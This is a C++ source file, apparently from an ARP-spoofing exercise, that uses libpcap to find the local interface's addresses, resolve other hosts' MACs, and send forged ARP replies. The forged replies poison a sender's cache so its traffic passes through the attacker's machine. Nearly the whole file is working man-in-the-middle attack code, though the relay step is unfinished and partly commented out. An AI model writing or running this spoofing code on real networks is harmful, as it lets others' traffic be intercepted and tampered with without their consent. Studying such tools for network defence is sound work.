#include "Packet.h"

bool Packet::openLiveCapture(){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return false;
    }
    return true;
}


bool Packet::setMyInterfaceMac(){
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return false;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return false;
    }
    memcpy(interfaceMac, ifr.ifr_hwaddr.sa_data, ETH_ADDR_LEN);
    close(sockfd);

    return true;
}


bool Packet::setMyInterfaceIp(){
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        printf("Fail to get interface IP address - socket() failed - %m\n");
        return false;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
        close(sockfd);
        return false;
    }

    interfaceIp = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
    close(sockfd);

    return true;
}


bool Packet::setMyInterfaceInfo(){
    if (!setMyInterfaceMac()) return false;
    if (!setMyInterfaceIp()) return false;
    return true;
}


void Packet::setEthHeader(u_int8_t* srcMac, u_int8_t* dstMac, u_int16_t ethType){
    for (int i = 0; i < ETH_ADDR_LEN; i++){
        ethHeader.srcMac[i] = srcMac[i];
        ethHeader.dstMac[i] = dstMac[i];
    }
    ethHeader.ethType = htons(ethType);
}


void Packet::setArpHeader(u_int8_t* srcMac, u_int32_t srcIp, u_int8_t* dstMac, u_int32_t dstIp, u_int16_t opCode){
    for (int i = 0; i < ETH_ADDR_LEN; i++){
        arpHeader.srcMac[i] = srcMac[i];
        arpHeader.dstMac[i] = dstMac[i];
    }
    arpHeader.srcIp = srcIp;
    arpHeader.dstIp = dstIp;
    arpHeader.op = htons(opCode);
}


void Packet::sendPacket(){
    int res = 0;
    if (ethHeader.ethType == htons(ethHdr::ARP)){
        ethArpHeader.eth = ethHeader;
        ethArpHeader.arp = arpHeader;
        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethArpHeader), sizeof(ethArpHdr));
    } else if (ethHeader.ethType == htons(ethHdr::IPv4)){
        ethIpv4Header.eth = ethHeader;
        ethIpv4Header.ipv4 = Ipv4Header;
        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&ethIpv4Header), sizeof(ethIpv4Hdr));
    }

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}


void Packet::sendPacket(u_char* packet){
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), sizeof(ethArpHdr));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

packetInfo Packet::captureNextPacket(){
    packetInfo capturedPacketInfo;
    capturedPacketInfo.status = pcap_next_ex(pcap, &capturedPacketInfo.header, &capturedPacketInfo.packet);
    return capturedPacketInfo;
}


void Packet::resolveMacByIp(u_int32_t ip){
    setEthHeader(interfaceMac, BROADCAST_MAC, ethHdr::ARP);
    setArpHeader(interfaceMac, interfaceIp, NULL_MAC, ip, arpHdr::ArpRequest);
    sendPacket();

    while (true){
        packetInfo capturedPacketInfo = captureNextPacket();
        if (capturedPacketInfo.status == 0) continue;
        if (capturedPacketInfo.status == PCAP_ERROR || capturedPacketInfo.status == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", capturedPacketInfo.status , pcap_geterr(pcap));
            break;
        }

        ethArpHdr* capturedPacket = (ethArpHdr*)(capturedPacketInfo.packet);
        if (ntohs(capturedPacket->eth.ethType) == ethHdr::ARP && capturedPacket->arp.srcIp == ip){
            for (int i = 0; i < ETH_ADDR_LEN; i++) arpTable[ip][i] = capturedPacket->eth.srcMac[i];
            break;
        }
    }
}


void Packet::resolveMacByIpforSpoof(u_int32_t senderIp, u_int32_t targetIp){
    resolveMacByIp(senderIp);
    resolveMacByIp(targetIp);

    SenderTargetPair pair;
    pair.sender.ip = senderIp;
    pair.target.ip = targetIp;
    for (int i = 0; i < ETH_ADDR_LEN; i++){
        pair.sender.mac[i] = arpTable[senderIp][i];
        pair.target.mac[i] = arpTable[targetIp][i];
    }
    senderTargetTable.push_back(pair);
}


void Packet::sendSpoofedPacket(u_int32_t senderIp, u_int32_t targetIp, u_int16_t opCode){
    setEthHeader(interfaceMac, arpTable[senderIp], ethHdr::ARP);
    setArpHeader(interfaceMac, targetIp, arpTable[senderIp], senderIp, opCode);
    sendPacket();
}


void Packet::continuousArpSpoofing(){
    while(true) {
        packetInfo capturedPacketInfo = captureNextPacket();
        if (capturedPacketInfo.status == 0) continue;
        if (capturedPacketInfo.status == PCAP_ERROR || capturedPacketInfo.status == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", capturedPacketInfo.status , pcap_geterr(pcap));
            break;
        }

        ethHdr* ethhdr = (ethHdr*)(capturedPacketInfo.packet);
        for (auto iter = senderTargetTable.begin(); iter != senderTargetTable.end(); iter++){
            //When ARP packet
            if (ethhdr->ethType == htons(ethHdr::ARP)){
                arpHdr* arphdr = (arpHdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
                fprintf(stderr, "%u\n", ntohl(arphdr->dstIp));
                fprintf(stderr, "%u\n", ntohl(iter->sender.ip));
                if (arphdr->srcIp == iter->sender.ip && arphdr->dstIp == iter->target.ip){
                    sendSpoofedPacket(arphdr->srcIp, arphdr->dstIp, arpHdr::ArpReply);
                    break;
                }
            }
            //When IPv4 packet -> Send Relay Packet
            else if (ethhdr->ethType == htons(ethHdr::IPv4)){
                ipv4Hdr* ipv4hdr= (ipv4Hdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
                if (ipv4hdr->srcIp == iter->sender.ip && ipv4hdr->dstIp != interfaceIp){
                    for (int i = 0; i < ETH_ADDR_LEN; i++) ethhdr->srcMac[i] = interfaceMac[i];
                    if (arpTable.count(iter->target.ip) == 0){
                        resolveMacByIp(iter->target.ip);
                        for (int i = 0; i < ETH_ADDR_LEN; i++) ethhdr->dstMac[i] = arpTable[iter->target.ip][i];
                    }
                    //sendPacket(capturedPacketInfo.packet);
                    break;
                }
            }
        }
    }
}


void Packet::closeLiveCapture(){
    pcap_close(pcap);
}


